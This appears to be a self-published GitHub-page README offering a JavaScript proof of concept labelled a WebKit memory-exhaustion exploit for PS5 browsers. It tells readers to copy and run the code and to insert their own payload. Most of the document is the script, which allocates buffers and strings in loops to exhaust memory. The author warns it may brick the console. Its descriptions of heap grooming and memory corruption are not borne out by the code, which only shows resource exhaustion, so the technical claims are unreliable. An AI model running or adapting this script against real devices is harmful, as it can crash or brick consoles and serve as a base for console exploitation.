https://seregonwar.github.io/Overflow/


**Author:https://x.com/idebty?t=MT_ShLOs9wP9hcH3GNtkNA&s=09**
I'm self taught I don't know any one in the community if you want to use this use it but credit me.
# WebKit Memory Leak PoC

## Description
This Proof of Concept (PoC) demonstrates a WebKit memory exhaustion exploit that I have been working on. The current iteration works but still needs to be fully exploited. Below is the JavaScript code that shows how it operates, along with explanations of each step.

## How it Works
The code below follows five key steps:

1. **Heap Initialization**: Allocates memory in a controlled manner.
2. **Heap Grooming**: Manipulates memory to create gaps for the exploit.
3. **Memory Exhaustion**: Continuously allocates and clears memory to exhaust resources.
4. **Payload Execution**: Executes the payload to perform memory corruption.
5. **Exploit Execution**: Runs the steps in sequence to trigger the memory exhaustion.

## Code
```javascript
// Step 1: Initialize Controlled Memory
function initializeHeap() {
    //alert("Int heap");
    let buffers = [];
    for (let i = 0; i < 2048; i++) { // Reduced allocations
        buffers.push(new ArrayBuffer(500000)); // Smaller blocks of memory
    }
    return buffers;
}

// Step 2: Groom the Heap
function groomHeap() {
    //alert("groom heap");
    let tempArray = [];

    // Allocate and deallocate in patterns
    for (let i = 0; i < 2048; i++) { // Reduced iterations
        let buffer = new ArrayBuffer(1000); // Allocate smaller blocks
        tempArray.push(buffer);
    }

    // Deallocate some of the buffers to create holes in the heap
    for (let i = 0; i < 1512; i++) { // Fewer deallocations
        tempArray[i] = null; // Free up space to create holes in the heap
    }

    return tempArray;
}

// Step 3: Memory Exhaustion Function
function memExh() {
    let bufferArray = [];
    for (let i = 0; i < 2048; i++) { // Reduced iterations
        bufferArray.push(new ArrayBuffer(900000)); // Allocate smaller buffers
        if (bufferArray.length > 512) { // Less aggressive clearing
            bufferArray = []; // Clear buffer array to exhaust memory
        }
    }
}

// Step 4: The Exploit Payload Function
function payload() {
    let largeString = "B".repeat(900000); // Smaller initial string
    let obj = {};
    let iterationCount = 0; // Counter to track number of iterations

    while (true) {
        // String concatenation
        largeString += largeString;
        if (largeString.length > 100000000) { // Lower threshold for reset
            largeString = "B".repeat(900000); // Reset string to avoid overflow
        }
        memExh();
        iterationCount++;
        if (iterationCount > 64) break; // Control the number of iterations
    }
}

// Step 5: Perform the Exploit
function performExploit() {
    let controlledBuffers = initializeHeap(); // Initialize the heap
    let groomedHeap = groomHeap(); // Groom the heap
    
    // Start memory corruption
    memExh();

    // Run the payload
    payload();
}

performExploit();
```
##**Instructions**

1. Copy the above code and run it in a Exploitable PS5(Works Untill guess 9.60?) this might not be useful in ps4


2. Be mindful that this is a PoC and should be used for educational purposes only.


3. Further testing is required to fully understand this vulnerability.

4.Place Your Payload in the payload function

Disclaimer

This PoC is for educational purposes only. The author is not responsible for any misuse of this code.
##**IM NOT LIABLE TO ANY DAMAGES CAUSED BY THIS POC OR ANY OTHER USE OF IT THIS CAN BRICK AND MIGHT BRICK YOUR SYSTEM IF LEFT UNEDITED **


